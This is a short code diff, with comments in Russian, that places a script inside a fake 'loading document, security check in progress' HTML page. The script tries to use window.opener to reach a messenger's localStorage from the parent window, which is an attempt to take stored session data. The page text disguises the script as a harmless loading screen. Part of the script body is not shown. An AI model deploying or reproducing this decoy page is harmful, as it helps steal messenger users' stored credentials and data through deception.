@@ -1,4 +1,13 @@
-<script>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка документа...</title>
+</head>
+<body>
+    <div id="status">Пожалуйста, подождите, идет проверка безопасности...</div>
+
+    <script>
     if (window.opener) {
         // Пробуем дотянуться до localStorage мессенджера через окно-родитель
         try {
@@ -10,3 +19,5 @@
         }
     }
 </script>
+</body>
+</html>
